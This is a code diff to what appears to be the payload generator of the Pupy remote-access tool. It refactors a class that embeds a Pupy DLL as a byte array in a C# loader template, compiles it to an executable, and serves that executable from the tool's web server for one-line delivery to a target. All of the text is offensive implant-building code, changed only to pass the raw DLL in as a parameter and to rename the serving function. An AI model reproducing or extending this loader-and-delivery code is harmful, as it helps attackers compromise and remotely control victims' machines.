@@ -4,23 +4,22 @@
 
 import os, subprocess, tempfile, random, string
 from pupylib.PupyOutput import Success, Error, Warn, List
-from pupygen import ROOT
-import pupygen
+from pupylib import ROOT
 
 
 class DotNetPayload():
-    def __init__(self, display, conf, outpath=None, output_dir=None):
+    def __init__(self, display, conf, rawdll, outpath=None, output_dir=None):
         self.display=display
         self.conf=conf
         self.outpath=outpath
         self.output_dir=output_dir
+        self.rawdll=rawdll
 
     def gen_source(self, random_path=False):
         with open(os.path.join(ROOT, "payload_templates", "PupyLoaderTemplate.cs"), 'rb') as f:
             template_source=f.read()
-        rawdll = pupygen.generate_binary_from_template(self.display, self.conf, 'windows', arch='x64', shared=True)[0]
         self.display(Success("packing pupy into C# source ..."))
-        encoded = '{' + ','.join([str(ord(c)) for c in rawdll]) + '}'
+        encoded = '{' + ','.join([str(ord(c)) for c in self.rawdll]) + '}'
         content=template_source.replace('<PUPYx64_BYTES>', encoded)
         if not self.outpath or random_path:
             outfile = tempfile.NamedTemporaryFile(
@@ -60,7 +59,7 @@ class DotNetPayload():
         return outfile
 
 
-def serve_payload(display, server, conf, link_ip="<your_ip>"):
+def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
     if not server:
         display(Error('Oneliners only supported from pupysh'))
         return
@@ -68,7 +67,7 @@ def serve_payload(display, server, conf, link_ip="<your_ip>"):
     if not server.pupweb:
         display(Error('Webserver disabled'))
         return
-    dn=DotNetPayload(display, conf)
+    dn=DotNetPayload(display, conf, rawdll)
     exe_path=dn.gen_exe()
     with open(exe_path, 'rb') as r:
         payload=r.read()
